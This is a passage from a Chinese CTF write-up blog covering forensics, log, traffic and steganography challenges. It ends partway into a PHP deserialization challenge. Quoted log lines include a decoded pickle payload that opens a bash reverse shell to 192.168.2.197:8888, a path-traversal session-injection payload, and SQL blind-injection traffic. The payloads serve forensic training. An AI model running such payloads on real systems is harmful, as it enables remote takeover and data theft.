title="问6"></a>问6</h2><pre class="line-numbers language-none"><code class="language-none">被害者手机上被拿走了的私钥文件内容是<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问7"><a href="#问7" class="headerlink" title="问7"></a>问7</h2><pre class="line-numbers language-none"><code class="language-none">黑客访问&#x2F;攻击了内网的几个服务器，IP地址为<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面黑客对192.168.1.12进行了sql盲注</p><p>另外，根据access.log文件</p><p><img src="https://imag.keyblue.cn/imag/202309011023611.png" alt="image-20230901102302571"></p><p>我们可以知道172.28.0.3也是受害者之一</p><pre class="line-numbers language-none"><code class="language-none">172.28.0.3#192.168.1.12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问8"><a href="#问8" class="headerlink" title="问8"></a>问8</h2><pre class="line-numbers language-none"><code class="language-none">黑客写入了一个webshell，其密码为<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们观察log文件</p><p><img src="https://imag.keyblue.cn/imag/202309011030427.png" alt="image-20230901103009402"></p><p>发现黑客在执行whoami</p><p>所以密码为</p><pre class="line-numbers language-none"><code class="language-none">fxxk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="陇剑杯-2021-SQL注入"><a href="#陇剑杯-2021-SQL注入" class="headerlink" title="[陇剑杯 2021]SQL注入"></a>[陇剑杯 2021]SQL注入</h1><h2 id="问1-3"><a href="#问1-3" class="headerlink" title="问1"></a>问1</h2><p>明显的布尔盲注</p><h2 id="问2-3"><a href="#问2-3" class="headerlink" title="问2"></a>问2</h2><p>拉到日志最后</p><p><img src="https://imag.keyblue.cn/imag/202308271453488.png" alt="image-20230827145327453"></p><p>看到字段为flag，数据库为sqli，表为flag</p><h2 id="问3-3"><a href="#问3-3" class="headerlink" title="问3"></a>问3</h2><p>观察发现匹配到正确的字符时，响应的页面字符大小为<code>479|480|481|482</code>根据这个特征有此脚本</p><pre class="line-numbers language-none"><code class="language-none">import reflag &#x3D; &#39;&#39;with open(&#39;res&#x2F;access.log&#39;, &#39;r&#39;) as f:    for line in f:        if re.search(&#39;(select%20flag%20from%20sqli.flag)&#39;, line):            if re.search(&#39;479|480|481|482&#39;, line):                line &#x3D; re.findall(&quot;%20&#x3D;%20&#39;(.+)&#39;,1,&quot;, line)[0]                flag +&#x3D; line                print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后得到flag值<code>flag&#123;deddcd67-bcfd-487e-b940-1217e668c7db&#125;</code></p><h1 id="陇剑杯-2021-内存分析"><a href="#陇剑杯-2021-内存分析" class="headerlink" title="[陇剑杯 2021]内存分析"></a>[陇剑杯 2021]内存分析</h1><h2 id="问1-4"><a href="#问1-4" class="headerlink" title="问1"></a>问1</h2><p>解开压缩包得到两个文件</p><p><img src="https://imag.keyblue.cn/imag/202308291018351.png" alt="image-20230829101826317"></p><p>先看txt文本</p><p><img src="https://imag.keyblue.cn/imag/202308291018667.png" alt="image-20230829101857649"></p><p>使用volatility对文件进行分析</p><p>首先查看镜像信息</p><p><img src="https://imag.keyblue.cn/imag/202308291034248.png" alt="image-20230829103417211"></p><p>题目是需要知道虚拟机的密码，可以使用mimikatz查看或者lsadump</p><p><img src="https://imag.keyblue.cn/imag/202308291038639.png" alt="image-20230829103822601"></p><p>flag值：flag{W31C0M3 T0 THiS 34SY F0R3NSiCX}</p><h2 id="问2-4"><a href="#问2-4" class="headerlink" title="问2"></a>问2</h2><p>先找找关键字ctf或者flag什么的，发现有HUAWEI</p><p><img src="https://imag.keyblue.cn/imag/202308291057514.png" alt="image-20230829105701484"></p><p>根据题意，flag在某品牌手机的备份文件里面，随机筛选HUAWEI关键词</p><p><img src="https://imag.keyblue.cn/imag/202308291057863.png" alt="image-20230829105749832"></p><p>将文件都下载下来</p><p><img src="https://imag.keyblue.cn/imag/202308291103074.png" alt="image-20230829110349048"></p><p>下载华为备份解密工具，</p><p>工具地址：<a href="https://github.com/RealityNet/kobackupdec">https://github.com/RealityNet/kobackupdec</a></p><p>使用命令解密 解密需要密码，密码根据提示是上一问的flag值</p><pre class="line-numbers language-none"><code class="language-none">python .\kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX &#39;C:\Users\dell\Downloads\Compressed\kobackupdec-master\HUAWEI P40_2021-aa-bb xx.yy.zz&#39; C:\Users\dell\Downloads\Compressed\kobackupdec-master\buk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开解密后的文件夹，发现一个压缩包</p><p><img src="https://imag.keyblue.cn/imag/202308291220132.png" alt="image-20230829122055096"></p><p>使用7z打开</p><p><img src="https://imag.keyblue.cn/imag/202308291221941.png" alt="image-20230829122133917"></p><p>发现flag值flag{TH4NK Y0U FOR DECRYPTING MY DATA}</p><h1 id="陇剑杯-2021-日志分析"><a href="#陇剑杯-2021-日志分析" class="headerlink" title="[陇剑杯 2021]日志分析"></a>[陇剑杯 2021]日志分析</h1><h2 id="问1-5"><a href="#问1-5" class="headerlink" title="问1"></a>问1</h2><p>根据日志文件发现响应码200极少，随机筛选含200的行。</p><p>发现了泄露的<a href="http://www.zip文件/">www.zip文件</a></p><p><img src="https://imag.keyblue.cn/imag/202308271557455.png" alt="image-20230827155715439"></p><h2 id="问2-5"><a href="#问2-5" class="headerlink" title="问2"></a>问2</h2><p>查看日志，在最后发现了&#x2F;?filename&#x3D;的语句，</p><pre class="line-numbers language-none"><code class="language-none">..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&amp;content&#x3D;func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D解码得到..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_car&amp;content&#x3D;func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;.&#x2F;files&#x2F;filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;.&#x2F;files&#x2F;call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;&#x2F;flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以文件名为sess_car</p><h2 id="问3-4"><a href="#问3-4" class="headerlink" title="问3"></a>问3</h2><pre class="line-numbers language-none"><code class="language-none">..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&amp;content&#x3D;func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D解码得到..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_car&amp;content&#x3D;func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;.&#x2F;files&#x2F;filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;.&#x2F;files&#x2F;call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;&#x2F;flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到使用的是SplFileObject类读取的flag</p><h1 id="陇剑杯-2021-简单日志分析"><a href="#陇剑杯-2021-简单日志分析" class="headerlink" title="[陇剑杯 2021]简单日志分析"></a>[陇剑杯 2021]简单日志分析</h1><h2 id="问1-6"><a href="#问1-6" class="headerlink" title="问1"></a>问1</h2><p>简单分析可知参数为<code>user</code></p><h2 id="问2-6"><a href="#问2-6" class="headerlink" title="问2"></a>问2</h2><pre class="line-numbers language-none"><code class="language-none">127.0.0.1 - - [07&#x2F;Aug&#x2F;2021 10:43:12] &quot;GET &#x2F;?user&#x3D;STAKcDAKMFMnY2F0IC9UaDRzX0lTX1ZFUllfSW1wb3J0X0ZpMWUnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu HTTP&#x2F;1.1&quot; 500 -解密得到I0p00S&#39;cat &#x2F;Th4s_IS_VERY_Import_Fi1e&#39;p10(g0lp20(I0tp30(g3I0dp40cossystemp50g5(g1tR.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以黑客查看秘密文件的绝对路径为<code>/Th4s_IS_VERY_Import_Fi1e</code></p><h2 id="问3-5"><a href="#问3-5" class="headerlink" title="问3"></a>问3</h2><pre class="line-numbers language-none"><code class="language-none">127.0.0.1 - - [07&#x2F;Aug&#x2F;2021 10:43:12] &quot;GET &#x2F;?user&#x3D;STAKcDAKMFMnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjIuMTk3Lzg4ODggMD4mMScKcDEKMChnMApscDIKMChJMAp0cDMKMChnMwpJMApkcDQKMGNvcwpzeXN0ZW0KcDUKMGc1CihnMQp0Ui4&#x3D; HTTP&#x2F;1.1&quot; 500 -解码得到I0p00S&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.197&#x2F;8888 0&gt;&amp;1&#39;p10(g0lp20(I0tp30(g3I0dp40cossystemp50g5(g1tR.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以黑客反弹shell的ip和端口为192.168.2.197:8888</p><h1 id="鹏城杯-2022-简单取证"><a href="#鹏城杯-2022-简单取证" class="headerlink" title="[鹏城杯 2022]简单取证"></a>[鹏城杯 2022]简单取证</h1><pre class="line-numbers language-none"><code class="language-none">.&#x2F;volatility -f file.raw imageinfo <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309251411174.png" alt="image-20230925141104103"></p><p>看一下cmd历史命令</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;volatility -f file.raw --profile&#x3D;WinXPSP2x86 cmdscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309251420640.png" alt="image-20230925142054617"></p><p>看到了一个密码，内容是<code>62b041223bb9a</code>，应该在后面有用</p><p>再看一下浏览器访问记录</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;volatility -f file.raw --profile&#x3D;WinXPSP2x86 iehistory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309251411609.png" alt="image-20230925141152586"></p><p>发现了一个图片文件，保存下来</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;volatility -f file.raw --profile&#x3D;WinXPSP2x86 filescan | grep secret.jpg.&#x2F;volatility -f file.raw --profile&#x3D;WinXPSP2x86 dumpfiles -Q 0x0000000002325028 -D .&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309251413006.png" alt="image-20230925141315977"></p><p>查看文件，对文件base64解码，010查看发现文件倒过来了，根据文件头特征判断是zip文件</p><p>建议用base64解码和写入全程使用python</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res/file.None.0x81fc6610.dat'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res/1.zip'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开<code>1.zip</code>，需要密码才能解压，用前面发现的密码解开</p><p>压缩包里的<code>flag.txt</code>，有大量数字组合，其中每组第二个数字到<code>349</code>就会重新计数，最后一个组合是<code>349 349</code>，猜测是坐标画图</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imageim <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">,</span> <span class="token number">350</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"res/flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    r <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>lst <span class="token operator">=</span> r<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> lst<span class="token punctuation">:</span>    x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>im<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"res/flag.png"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>画出来是一个二维码，扫描二维码即可得到flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;a6b93e36-f097-11ec-a9b2-5254002d2b31&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="鹤城杯-2021-Misc2"><a href="#鹤城杯-2021-Misc2" class="headerlink" title="[鹤城杯 2021]Misc2"></a>[鹤城杯 2021]Misc2</h1><p>先拉到010查看，没有发现</p><p>再拉到kali binwalk分离，没有隐藏文件</p><p>zsteg看看</p><p><img src="https://imag.keyblue.cn/imag/202309051359150.png" alt="image-20230905135915097"></p><p>发现了Unicode编码，拉出来解码</p><p><img src="https://imag.keyblue.cn/imag/202309051400423.png" alt="image-20230905140039392"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;h0w_4bouT_enc0de_4nd_pnG&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="鹤城杯-2021-New-MISC"><a href="#鹤城杯-2021-New-MISC" class="headerlink" title="[鹤城杯 2021]New MISC"></a>[鹤城杯 2021]New MISC</h1><p>题目给的是一个pdf文件</p><p><img src="https://imag.keyblue.cn/imag/202308291322049.png" alt="image-20230829132242964"></p><p>010打开看不出来什么东西</p><p>应该是一个隐写</p><p>wbstego4open下载 ：<a href="http://wbstego.wbailer.com/">http://wbstego.wbailer.com/</a></p><p>用wbstego4open来查看隐写内容</p><p>打开软件选择Decode</p><p><img src="https://imag.keyblue.cn/imag/202308291729242.png" alt="image-20230829172914185"></p><p>选择PDF把需要查看的文件选上</p><p><img src="https://imag.keyblue.cn/imag/202308291730071.png" alt="image-20230829173010034"></p><p>这里空着</p><p><img src="https://imag.keyblue.cn/imag/202308291730875.png" alt="image-20230829173022840"></p><p>选择保存到哪里，这里选择保存到1.txt</p><p><img src="https://imag.keyblue.cn/imag/202308291730725.png" alt="image-20230829173049688"></p><p>完成</p><p><img src="https://imag.keyblue.cn/imag/202308291731142.png" alt="image-20230829173114105"></p><p>打开1.txt</p><p><img src="https://imag.keyblue.cn/imag/202308291732803.png" alt="image-20230829173249779"></p><p>flag值：flag{verY_g00d_YoU_f0und_th1s}</p><h1 id="鹤城杯-2021-流量分析"><a href="#鹤城杯-2021-流量分析" class="headerlink" title="[鹤城杯 2021]流量分析"></a>[鹤城杯 2021]流量分析</h1><p>题目打开，是个pacpng包</p><p><img src="https://imag.keyblue.cn/imag/202308281806840.png" alt="image-20230828180613752"></p><p>明显的sql注入流量</p><p>筛选流量</p><p><img src="https://imag.keyblue.cn/imag/202308281821128.png" alt="image-20230828182101087"></p><p>选择导出为纯文本</p><p><img src="https://imag.keyblue.cn/imag/202308281825573.png" alt="image-20230828182552538"></p><p>取消勾选Packet details后导出</p><p><img src="https://imag.keyblue.cn/imag/202308281936860.png" alt="image-20230828193622826"></p><p>导出后的文件</p><p><img src="https://imag.keyblue.cn/imag/202308281937902.png" alt="image-20230828193727851"></p><p>脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> reflag <span class="token operator">=</span> <span class="token string">''</span>var_back <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res/timu.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'(text/html)'</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[%20and%20ascii(substr((select%20flag%20from%20t),]"</span></span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">:</span>            var <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[,1))]=(.*?)--+"</span></span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> var <span class="token operator">&lt;=</span> var_back<span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>var_back<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            var_back <span class="token operator">=</span> var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202308282038873.png?x-image-process=style/style-d277" alt="image-20230828203829847"></p><h1 id="HDCTF-2023-MasterMisc"><a href="#HDCTF-2023-MasterMisc" class="headerlink" title="[HDCTF 2023]MasterMisc"></a>[HDCTF 2023]MasterMisc</h1><ul><li><p>把压缩包使用ARCHPR爆破，得到密码，解开后是一个图片</p></li><li><p>把图片扔到foremost分解，得到另一个图和一个wav文件</p></li></ul><p>先看图片，根据图片上的提示文字，推断需要修改高度，010修改高度得到中间一段flag</p><p><img src="https://imag.keyblue.cn/imag/202310101032597.png" alt="image-20231010103259560"></p><p>再看音频文件，audacity查看频谱图发现前段flag</p><p><img src="https://imag.keyblue.cn/imag/202310101030653.png?x-image-process=style/style-d277" alt="image-20231010103027481"></p><p>至此，只剩下原图没有找到flag，</p><ul><li>回到原图，在图二和音频文件中找到后段flag</li></ul><p><img src="https://imag.keyblue.cn/imag/202310101038193.png" alt="image-20231010103817160"></p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;e67d8104-7536-4433-bfff-96759901c405&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Web模块做题记录</title>
      <link href="/2023/08/27/NSSCTF%20Web%E6%A8%A1%E5%9D%97%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/08/27/NSSCTF%20Web%E6%A8%A1%E5%9D%97%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="NISACTF-2022-babyserialize"><a href="#NISACTF-2022-babyserialize" class="headerlink" title="[NISACTF 2022]babyserialize"></a>[NISACTF 2022]babyserialize</h1><p>先看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"waf.php"</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">NISA</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fun</span><span class="token operator">=</span><span class="token string double-quoted-string">"show_me_flag"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$txw4ever</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">==</span><span class="token string double-quoted-string">"show_me_flag"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">hint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$from</span><span class="token punctuation">,</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">=</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fun</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">checkcheck</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">txw4ever</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">txw4ever</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">TianXiWei</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$x</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ext</span><span class="token operator">-></span><span class="token function">nisa</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">x</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Ilovetxw</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$huang</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$su</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$fun1</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">huang</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">=</span><span class="token variable">$arg</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$bb</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">su</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$bb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">four</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"TXW4EVER"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$fun</span><span class="token operator">=</span><span class="token string single-quoted-string">'abc'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fun</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"sixsixsix"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 